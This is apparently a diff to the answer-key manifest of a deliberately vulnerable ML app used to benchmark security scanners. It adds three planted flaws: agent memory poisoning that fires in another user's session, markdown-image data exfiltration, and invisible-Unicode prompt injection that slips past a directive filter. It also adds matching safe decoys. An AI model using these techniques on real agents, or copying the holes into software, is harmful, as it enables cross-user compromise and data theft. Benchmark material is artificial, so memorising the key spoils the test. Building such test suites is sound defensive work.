@@ -20,7 +20,8 @@ meta:
     5: agentic / LLM
     6: max — reflection/dynamic-dispatch, carrier laundering, blind/OOB, conditional
        sanitizers, off-list library sinks, call-site sensitivity, taint dilution,
-       multi-hop agent, MCP protocol boundary (plus precision decoys)
+       multi-hop agent, MCP protocol boundary, persistent cross-user agent memory,
+       Unicode/ASCII-smuggling filter bypass (plus precision decoys)
 
 vulnerabilities:
   - id: V01
@@ -513,6 +514,85 @@ vulnerabilities:
       extra) rather than the in-process agent loop.
     poc: tests/test_exploits_tier6.py::test_v29_mcp_tool_description_poisoning
 
+  - id: V30
+    title: Agent long-term memory poisoning (persistent, cross-user)
+    cwe: LLM01
+    huntr_analog: "persistent prompt injection via agent memory (mem0/LangGraph store) read back cross-session"
+    tier: 6
+    exploitable: true
+    source:
+      - {file: dvml/api/agent.py, symbol: add_memory, note: "content (JSON body) -> AgentMemory"}
+      - {file: dvml/api/agent.py, symbol: session, note: "message also remembered after each turn"}
+    sink: {file: dvml/agent/tools.py, symbol: run_sql, line_hint: 18}
+    taint_path:
+      - dvml/api/agent.py:add_memory (attacker content persisted to AgentMemory; NOT executed in the writer's session)
+      - dvml/agent/memory.py:remember (row stored with owner_id, but that column is never used to scope reads)
+      - dvml/api/agent.py:session (a DIFFERENT user's later turn)
+      - dvml/agent/core.py:run_agent use_memory=True (recall() pulls ALL memories into context, unscoped)
+      - dvml/agent/memory.py:recall (no owner filter -- cross-tenant)
+      - dvml/agent/tools.py:run_sql (attacker-embedded directive fires in the victim's session)
+    sanitizers_present:
+      - "AgentMemory.owner_id is recorded on write and recall_scoped() filters by it, but the shared session path calls the unscoped recall() (misdirection: the isolation primitive exists and is used elsewhere -- see D07 -- just not here)"
+    notes: >
+      The persistence upgrade of V17: instead of poisoning one model card read
+      once, the attacker writes to durable agent memory that is recalled into
+      every future session, for every user, until deleted. Source and sink are
+      separated by a DB round-trip AND a user/session boundary -- no single
+      request both writes and triggers. The write endpoint merely stores
+      (nothing fires for the attacker), so a purely intra-request or
+      intra-session taint view sees two innocuous halves.
+    poc: tests/test_exploits_tier6.py::test_v30_agent_memory_poisoning
+
+  - id: V31
+    title: Markdown-image data exfiltration in rendered assistant/card preview
+    cwe: CWE-200
+    huntr_analog: "zero-click data exfil via rendered ![](attacker/?q=...) in an LLM chat/report UI (ChatGPT/Bard/Writer class)"
+    tier: 5
+    exploitable: true
+    source: {file: dvml/api/models.py, symbol: create_model, note: "model_card (also reachable from assistant answer)"}
+    sink: {file: dvml/services/markdown.py, symbol: render_markdown, line_hint: 20}
+    taint_path:
+      - dvml/api/models.py:create_model (model_card with an off-origin markdown image, or assistant output)
+      - dvml/api/reports.py:markdown_preview (any user renders any model_id -- no owner check, cross-tenant like V19)
+      - dvml/services/markdown.py:render_markdown (![alt](src) -> <img src> with the URL emitted verbatim, no host allow-list)
+      - "viewer's browser auto-fetches the off-origin <img>, leaking whatever the attacker encoded in the query string (zero-click)"
+    sanitizers_present:
+      - "render_markdown_safe() restricts <img src> to the app's own origin and drops off-origin images -- present in the same module but NOT used on this path (see D08)"
+    notes: >
+      Distinct from the generic innerHTML XSS rule (V19): the taint SOURCE is
+      LLM/user Markdown and the SINK is an image URL, so the exfiltration works
+      even under an HTML sanitizer that permits <img> (as most chat UIs do) and
+      even with scripts fully blocked. Almost no scanner models the image-src
+      egress channel. Composes with any field that reflects secret/conversation
+      data into the card body.
+    poc: tests/test_exploits_tier6.py::test_v31_markdown_image_exfil
+
+  - id: V32
+    title: Unicode/ASCII-smuggling prompt injection bypasses the directive filter
+    cwe: LLM01
+    huntr_analog: "invisible-Unicode (tag-block / zero-width) prompt injection evading a text filter"
+    tier: 6
+    exploitable: true
+    source: {file: dvml/api/agent.py, symbol: ask, note: "message (Unicode Tags-block-encoded directive)"}
+    sink: {file: dvml/agent/tools.py, symbol: run_sql, line_hint: 18}
+    taint_path:
+      - dvml/api/agent.py:ask (message, routed through the injection filter)
+      - dvml/agent/sanitize.py:strip_directives (regex matches only literal ASCII [[TOOL:...]] -- a normalization gap: it never folds/strips Cf tag-block or zero-width characters)
+      - dvml/agent/core.py:run_agent
+      - dvml/agent/llm.py:_deobfuscate (the model folds U+E00xx tag chars back to ASCII, as a capable LLM does)
+      - dvml/agent/tools.py:run_sql (the smuggled directive, invisible in review, executes)
+    sanitizers_present:
+      - "strip_directives() IS applied on /ask and DOES neutralise a plainly-visible [[TOOL:...]] (see D09) -- it is bypassed only because it matches codepoints, not the normalized meaning (the tell: a filter over prompt-bound text that lacks Unicode normalization / Cf-stripping)"
+    notes: >
+      Novel and cheap to detect statically: a regex scanner can flag Unicode
+      Tags-block (U+E0000-U+E007F) or zero-width characters inside string
+      literals used as prompts, tool descriptions, or in instruction files
+      (.cursorrules / CLAUDE.md / copilot-instructions / MCP tool-description
+      fields) with near-zero false positives. This entry exercises the taint
+      variant (untrusted request text); the same class also appears as a pure
+      presence rule over instruction/config files.
+    poc: tests/test_exploits_tier6.py::test_v32_unicode_smuggling_injection
+
 # Precision decoys — deliberately SAFE code that closely resembles a planted
 # bug. A taint engine or agent that reports any of these scores a FALSE POSITIVE.
 decoys:
@@ -546,6 +626,21 @@ decoys:
     why_safe: "render_builtin_report() resolves the filename via BUILTIN_KINDS.get(kind, 'summary.tpl'); the value passed to load_template_file is always one of two hardcoded literals no matter what `kind` is"
     location: {file: dvml/services/reports.py, symbol: render_builtin_report}
     proof: tests/test_exploits_tier6.py::test_d06_builtin_kind_ignores_traversal
+  - id: D07
+    resembles: V30 (agent memory poisoning)
+    why_safe: "recall_scoped() filters AgentMemory by owner_id, so the per-user notes view (GET /api/agent/memory) never returns another user's memory; only the shared session path uses the unscoped recall()"
+    location: {file: dvml/agent/memory.py, symbol: recall_scoped}
+    proof: tests/test_exploits_tier6.py::test_d07_scoped_memory_recall_is_isolated
+  - id: D08
+    resembles: V31 (markdown-image exfil)
+    why_safe: "render_markdown_safe() only emits <img src> for the app's own origin (relative/allow-listed prefixes, no scheme) and degrades off-origin images to their alt text — no auto-loading egress channel"
+    location: {file: dvml/services/markdown.py, symbol: render_markdown_safe}
+    proof: tests/test_exploits_tier6.py::test_d08_safe_markdown_drops_offorigin_image
+  - id: D09
+    resembles: V32 (directive filter) — SAME filter, visible vs. smuggled input
+    why_safe: "strip_directives() correctly removes a plainly-visible [[TOOL:...]] directive on /api/agent/ask; it is a real (if incomplete) control, not a no-op — flag the missing Unicode normalization, not the filter itself"
+    location: {file: dvml/agent/sanitize.py, symbol: strip_directives}
+    proof: tests/test_exploits_tier6.py::test_d09_visible_directive_is_filtered
 
 chains:
   - id: CHAIN_A
